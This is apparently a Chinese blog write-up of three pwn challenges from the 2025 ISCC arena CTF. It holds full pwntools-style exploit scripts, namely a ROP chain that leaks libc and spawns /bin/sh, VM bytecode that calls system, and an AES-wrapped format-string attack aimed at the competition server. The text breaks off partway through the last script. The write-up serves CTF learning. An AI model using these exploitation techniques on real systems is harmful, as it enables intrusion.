        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>相比练武赛，擂台赛的题目指令还是要高很多的，里面都是师傅们用心出的题目，感觉创新度还是有的，但是为什么那么多vm pwn？？？</p><p>通过网盘分享的文件：2025ISCC擂台赛Pwn全部附件.rar<br>链接: <a href="https://pan.baidu.com/s/1y_zdFltMZmCxfxalS9EuCw?pwd=xidp">https://pan.baidu.com/s/1y_zdFltMZmCxfxalS9EuCw?pwd=xidp</a> 提取码: xidp</p><h2 id="解出"><a href="#解出" class="headerlink" title="解出"></a>解出</h2><p>能力有限，很多方法可能并不是最优解，如果有师傅有更方便的方法愿意分享的话我会非非非常感谢的</p><h3 id="call"><a href="#call" class="headerlink" title="call"></a>call</h3><p><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/1.png"></p><p><code>checksec</code>查看程序保护，发现程序<code>没有</code>开启<code>pie保护</code>以及<code>canary保护</code><br><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/2.png"><br>程序存在明显的栈溢出<br><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/3.png"></p><p>直接溢出打ROP<code>泄露libc地</code>址然后执行<code>system(&quot;/bin/sh&quot;)</code>即可<br>完整exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> xidp <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#---------------------初始化----------------------------</span></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">elf_os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">challenge = <span class="string">&quot;./call&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc6_2.31-0ubuntu9.17_amd64.so&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;101.200.155.151:12100&#x27;</span></span><br><span class="line"><span class="comment"># 1-远程 其他-本地</span></span><br><span class="line"></span><br><span class="line">link = <span class="number">1</span></span><br><span class="line">io, elf, libc = loadfile(challenge, libc_path, ip, arch, elf_os, link)</span><br><span class="line">debug(<span class="number">0</span>)            <span class="comment"># 其他-debug   1-info</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------初始化-----------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------debug------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 断点</span></span><br><span class="line">cmd = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    set follow-fork-mode parent\n</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">bps = []</span><br><span class="line"><span class="comment">#---------------------debug-------------------------------</span></span><br><span class="line"><span class="comment"># pwndbg(0, bps, cmd)</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401273</span><span class="comment">#: pop rdi; ret</span></span><br><span class="line">pop_rsi_r_ret = <span class="number">0x0000000000401271</span><span class="comment">#: pop rsi; pop r15; ret;</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span><span class="comment">#: ret;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_r_ret)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">sdla(<span class="string">&quot;My name is\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">write_addr = uu64()</span><br><span class="line">leak(<span class="string">&quot;write_addr&quot;</span>)</span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]  </span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">sdla(<span class="string">&quot;My name is\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><p><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/4.png"></p><h3 id="vm-pwn"><a href="#vm-pwn" class="headerlink" title="vm_pwn"></a>vm_pwn</h3><p><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/5.png"></p><p>保护全开的一道vm pwn题<br><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/6.png"></p><p>程序逻辑比较常规，放入deepseek也可以分析出大概，总之程序的大致逻辑就是先让用户输入一大段内容当做后续的指令来执行<br>本题相对简单不过多阐述逆向过程，主要在于使用gdb去调试，查看输入的值被移动到了什么地方，为了方便读者逆向下面提供我已经逆向出的结构体，导入IDA中即可使用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">VMContext</span> &#123;</span></span><br><span class="line"><span class="type">uint64_t</span> regs[<span class="number">4</span>];</span><br><span class="line"><span class="type">uint64_t</span> ip_offset;</span><br><span class="line"><span class="type">uint64_t</span> *rsp;</span><br><span class="line"><span class="type">uint64_t</span> *code_base;</span><br><span class="line"><span class="type">uint64_t</span> reserved;</span><br><span class="line"><span class="type">uint64_t</span> *rbp;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>导入方法可以参考这篇文章:<a href="https://bbs.kanxue.com/thread-266419.htm">IDA技巧——结构体-软件逆向-看雪-安全社区|安全招聘|kanxue.com</a></p><p>各函数的分析结果如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sub_12D5 → vm_fetch_opcode <span class="comment">// 从指令流中读取1字节操作码</span></span><br><span class="line">sub_132C → vm_read_imm_qword <span class="comment">// 从指令流读取8字节立即数（用于MOV等指令的立即数操作）</span></span><br><span class="line">sub_1393 → vm_stack_push <span class="comment">// 压栈操作（带栈溢出检查）</span></span><br><span class="line">sub_1432 → vm_stack_pop   <span class="comment">// 出栈操作（带栈溢出检查）</span></span><br></pre></td></tr></table></figure><p>各个分支的分析结果如下</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td><strong>操作码</strong></td><td><strong>指令名称</strong></td><td><strong>行为描述</strong></td></tr><tr><td>0x00</td><td>MOV REG, IMM</td><td>将立即数存入寄存器</td></tr><tr><td>0x01</td><td>LOAD REG, [MEM]</td><td>从内存加载数据到寄存器</td></tr><tr><td>0x02</td><td>STORE [MEM], REG</td><td>将寄存器值存入内存</td></tr><tr><td>0x03</td><td>MOV REG1, REG2</td><td>寄存器间数据传输</td></tr><tr><td>0x04</td><td>CALL</td><td>函数调用（压栈返回地址）</td></tr><tr><td>0x05</td><td>POP REG</td><td>弹栈到寄存器</td></tr><tr><td>0x06</td><td>EXECUTE</td><td>执行函数指针</td></tr><tr><td>0x07</td><td>JMP IMM</td><td>无条件跳转到指定地址</td></tr><tr><td>0x08</td><td>RET</td><td>从函数返回</td></tr><tr><td>0x09</td><td>NOP</td><td>空操作</td></tr><tr><td>0x0A</td><td>ADD REG, IMM</td><td>寄存器加立即数</td></tr><tr><td>0x0B</td><td>SUB REG, IMM</td><td>寄存器减立即数</td></tr><tr><td>分析后的程序如下</td><td></td><td></td></tr><tr><td><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/7.png"></td><td></td><td></td></tr><tr><td><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/8.png"></td><td></td><td></td></tr><tr><td><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/9.png"></td><td></td><td></td></tr><tr><td><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/10.png"></td><td></td><td></td></tr></tbody></table><p>这里先给出完整的exp，exp上面写出了我的利用过程以及每个选项的作用供大家理解分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> xidp <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------初始化----------------------------</span></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">elf_os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">challenge = <span class="string">&quot;./pwn2&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;101.200.155.151:20000&#x27;</span></span><br><span class="line"><span class="comment"># 1-远程 其他-本地</span></span><br><span class="line">link = <span class="number">2</span></span><br><span class="line">io, elf, libc = loadfile(challenge, libc_path, ip, arch, elf_os, link)</span><br><span class="line"></span><br><span class="line">debug(<span class="number">0</span>)            <span class="comment"># 其他-debug   1-info</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment">#---------------------初始化-----------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------debug------------------------------</span></span><br><span class="line"><span class="comment"># 自定义cmd</span></span><br><span class="line">cmd = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    set follow-fork-mode parent</span></span><br><span class="line"><span class="string">    x/60gx $rebase(0x4000)</span></span><br><span class="line"><span class="string">    heap</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 断点</span></span><br><span class="line">bps = [<span class="number">0x014FF</span>]</span><br><span class="line"><span class="comment">#---------------------debug-------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mov_imm</span>(<span class="params">reg, imm</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;操作码 0x00: 将 8 字节立即数存入寄存器&quot;&quot;&quot;</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;0x00, reg_idx, &lt;8B立即数&gt;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> flat(p8(<span class="number">0</span>), p8(reg, signed=<span class="literal">True</span>), p64(imm, signed=<span class="literal">True</span>))  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_ptr_reg</span>(<span class="params">ptr_reg_addr, target_reg</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;操作码 0x01: 寄存器间接加载 (src -&gt; dst)&quot;&quot;&quot;</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;0x01, target_reg = *ptr_reg_addr&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> flat(</span><br><span class="line">            p8(<span class="number">1</span>),</span><br><span class="line">            p8(ptr_reg_addr, signed=<span class="literal">True</span>),  <span class="comment"># 允许为负数</span></span><br><span class="line">            p8(target_reg, signed=<span class="literal">True</span>)</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store_ptr_reg</span>(<span class="params">reg, target_reg</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;操作码 0x02: 寄存器间接存储 (src -&gt; [dst])&quot;&quot;&quot;</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;0x02, *target_reg = reg&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> flat(p8(<span class="number">2</span>), p8(reg), p8(target_reg))  <span class="comment"># &lt;bb + b → p8+p8+p8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mov_reg1_reg2</span>(<span class="params">reg1, reg2</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;操作码 0x03: 寄存器间移动 (src -&gt; dst)&quot;&quot;&quot;</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;0x03, reg2 = reg1&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> flat(p8(<span class="number">3</span>), p8(reg1), p8(reg2))  <span class="comment"># &lt;bb + b → p8+p8+p8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push</span>(<span class="params">reg_idx</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;操作码 0x04: 压栈&quot;&quot;&quot;</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;0x04, push reg; stack_rbp-0x8&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> flat(p8(<span class="number">4</span>), p8(reg_idx))  <span class="comment"># &lt;bB → p8+p8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop</span>(<span class="params">reg_idx</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;操作码 0x05: 出栈&quot;&quot;&quot;</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;0x05, pop reg stack_rbp+0x8&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> flat(p8(<span class="number">5</span>), p8(reg_idx))  <span class="comment"># &lt;bB → p8+p8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call</span>(<span class="params">reg_idx</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;操作码 0x06: 调用寄存器指向的函数&quot;&quot;&quot;</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;call reg&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> flat(p8(<span class="number">6</span>), p8(reg_idx))  <span class="comment"># &lt;bB → p8+p8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jmp_reg</span>(<span class="params">reg_idx</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;操作码 0x07: 跳转寄存器指向的地址&quot;&quot;&quot;</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;0x07, jmp reg 但是对跳转的范围有限制，所以我们不使用他&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> flat(p8(<span class="number">7</span>), p8(reg_idx))  <span class="comment"># &lt;bB → p8+p8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vm_exit</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;操作码 0x08: 虚拟机退出&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">8</span>)  <span class="comment"># b → p8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">reg, imm</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;操作码 0x0A: 寄存器加立即数&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> flat(p8(<span class="number">0xA</span>), p8(reg), p64(imm))  <span class="comment"># &lt;bbQ → p8+p8+p64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">reg, imm</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;操作码 0x0B: 寄存器减立即数&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> flat(p8(<span class="number">0xB</span>), p8(reg), p64(imm))  <span class="comment"># &lt;bbQ → p8+p8+p64</span></span><br><span class="line"></span><br><span class="line">puts_offset = libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_offset = puts_offset- libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_offset = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>)) - puts_offset</span><br><span class="line"></span><br><span class="line">leak(<span class="string">&quot;puts_offset&quot;</span>)</span><br><span class="line">leak(<span class="string">&quot;system_offset&quot;</span>)</span><br><span class="line">leak(<span class="string">&quot;bin_sh_offset&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># VM_list = 0x04060</span></span><br><span class="line"></span><br><span class="line">pwndbg(<span class="number">1</span>, bps, cmd)</span><br><span class="line"></span><br><span class="line">payload = load_ptr_reg(-<span class="number">11</span>, <span class="number">1</span>)</span><br><span class="line">payload += sub(<span class="number">1</span>, <span class="number">0x78</span>)</span><br><span class="line">payload += load_ptr_reg(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">payload += load_ptr_reg(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">payload += add(<span class="number">0</span>, bin_sh_offset)</span><br><span class="line">payload += sub(<span class="number">4</span>, system_offset)</span><br><span class="line">payload += call(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">put(payload)</span><br><span class="line"></span><br><span class="line">sda(<span class="string">&quot;Enter bytecode: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><p>利用思路: </p><ol><li><p>既然我们有call的功能，那么我们只需要让 <code>reg0</code> 为 <code>binsh地址</code> 然后随便找个寄存器放入 <code>system的地址</code> 然后call一下就可以了</p></li><li><p>那么我们就需要知道libc的基地址然后再libc中利用偏移找到binsh地址和system地址就可以了</p></li><li><p>想要知道libc基地址其实我们也很容易想到就是去got表里面拿，那么我们想要知道got表的地址就需要知道程序基地址</p></li><li><p>经过调试我们可以注意到 <code>0x04008 off_4008</code> 里面存放的指针是指向他自己的<br><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/11.png"><br><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/12.png"><br><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/13.png"></p></li><li><p>那么我们就可以利用这个地址获得got表地址，然后通过got表中的内容得到libc地址，再通过libc地址得到我们需要的binsh和system，最后call一下就拿到shell了</p></li></ol><p>exp的利用过程如下</p><ol><li><p>执行 <code>load_ptr_reg(-11, 1)</code> 和 <code>sub(1, 0x78)</code><br>先将这个地址放入到reg1寄存器中，然后通过加减把它变成指向puts的got表<br><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/14.png"><br><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/15.png"><br><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/16.png"></p></li><li><p>然后通过 <code>load_ptr_reg(1, 0)</code> <code>load_ptr_reg(1, 2)</code> 两条指令将 <code>puts_addr</code> 放入 <code>reg0</code> 和 <code>reg2</code>中</p></li><li><p><code>add(0, bin_sh_offset)</code> <code>sub(2, system_offset)</code> 通过对于偏移量的加减分别计算出 <code>binsh</code> 和 <code>system地址</code></p></li><li><p>直接 <code>call~~~~~~~~</code> 拿到shell</p></li></ol><p><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/17.png"></p><h3 id="Enc"><a href="#Enc" class="headerlink" title="Enc++"></a>Enc++</h3><p><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/18.png"></p><p>导入sig恢复部分的符号表<br>下面是导入 <code>libc6_2.35-0ubuntu3_amd64.sig</code> 后的main函数的样子<br><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/19.png"></p><p>漏洞点在main函数中存在格式化字符串的漏洞，sub_406142函数中存在read溢出<br><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/20.png"><br><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/21.png"></p><p>经过分析程序的大致逻辑就是说让用户输入，然后用户输入的东西会经过解密，然后成为printf的参数，在下面符合条件 <code>qword_932170 == 1</code> 就可以进入sub_406142函数中利用read溢出打ret2syscall</p><p>那么其实逻辑也很简单，就是分析这个加密解密的过程，我们自己将加密的东西输入让程序解密，以此来利用格式化字符串来泄露canary和修改qword_932170全局变量</p><p>这里可能疑惑的点是为什么有canary，明明checksec显示是没有的，可能是因为老版本的checksec是利用函数名字来判断有无canary的，符号表被去掉后就分析不出来了<br><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/22.png"></p><p>分析可知加密逻辑如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">程序对接收到的数据进行Base64解码后，按照以下规范解析加密参数： </span><br><span class="line"><span class="number">1.</span> 前<span class="number">32</span>字节作为AES<span class="number">-256</span>-CBC加密密钥(KEY) </span><br><span class="line"><span class="number">2.</span> 紧随的<span class="number">16</span>字节作为初始化向量(IV) </span><br><span class="line"><span class="number">3.</span> 剩余部分作为待解密的密文(miwen)</span><br></pre></td></tr></table></figure><p>程序可以循环两次，一次用于泄露canary，以此用于修改qword_932170<br><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/23.png"></p><p>在IDA中查看字符串可以发现&#x2F;bin&#x2F;sh，这像是一个提示，和&#x2F;bin&#x2F;sh 一起的还有我们解密所需要的密钥和向量<br><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/24.png"><br><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/25.png"></p><p>用AI分析跑出一个加密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># AES configuration</span></span><br><span class="line">AES_KEY = <span class="string">b&quot;aewfdefsebrfcyiseygfeaisfygaseiw&quot;</span></span><br><span class="line">AES_IV = <span class="string">b&quot;iscc20250ca81aff&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encrypt</span>(<span class="params">plaintext: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)</span><br><span class="line">padding = <span class="string">b&quot;\x00&quot;</span> * (<span class="number">16</span> - <span class="built_in">len</span>(plaintext) % <span class="number">16</span>)</span><br><span class="line">ciphertext = cipher.encrypt(plaintext + padding)</span><br><span class="line"><span class="keyword">return</span> base64.b64encode(ciphertext).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure><p>运行到 <code>call printf</code> 处查看栈内存，题目已经将 <code>qword_932170的地址</code> 放入栈中以此来减少我们的难度<br><img src="/../picture/2025ISCC%E6%93%82%E5%8F%B0%E8%B5%9B/26.png"></p><p>然后就是非常简单的使用格式化字符串泄露和修改随后打read溢出的ret2syscall</p><p>完整exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> xidp <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="comment">#---------------------初始化----------------------------</span></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">elf_os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">challenge = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;101.200.155.151:21000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1-远程 其他-本地</span></span><br><span class="line">link = <span class="number">2</span></span><br><span class="line">io, elf, libc = loadfile(challenge, libc_path, ip, arch, elf_os, link)</span><br><span class="line"></span><br><span class="line">debug(<span class="number">0</span>)            <span class="comment"># 其他-debug   1-info</span></span><br><span class="line"><span class="comment">#---------------------初始化-----------------------------</span></span><br><span class="line"><span 